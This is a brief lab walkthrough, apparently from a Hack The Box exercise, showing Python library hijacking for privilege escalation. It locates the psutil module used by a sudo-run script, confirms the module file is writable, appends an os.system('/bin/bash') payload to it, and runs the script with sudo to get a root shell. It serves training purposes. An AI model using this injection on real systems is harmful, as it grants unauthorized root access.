# [Python Library Hijacking](Python%20Library%20Hijacking.md)
### Follow along with the examples in this section to escalate privileges. Try to practice hijacking python libraries through the various methods discussed. Submit the contents of flag.txt under the root user as the answer.

Let's check the `/home/htb-student/mem_status.py`
![](Screenshot%202026-08-11%20at%2012.05.19.png)

Then, need to confirm that where psutil was loaded by Python
```shell
/usr/bin/python3 -c 'import psutil; print(psutil.__file__)'
```
![](Screenshot%202026-08-11%20at%2012.06.52.png)

```shell
/usr/bin/python3 -c 'import sys; print("\n".join(sys.path))'
```
![](Screenshot%202026-08-11%20at%2012.07.15.png)

Check the permission
```shell
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```
![](Screenshot%202026-08-11%20at%2012.07.49.png)

Finally, I add the payload and execute to obtain the root shell
```shell
echo 'import os; os.system("/bin/bash")' >> /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

sudo /usr/bin/python3 /home/htb-student/mem_status.py
```
![](Screenshot%202026-08-11%20at%2012.11.55.png)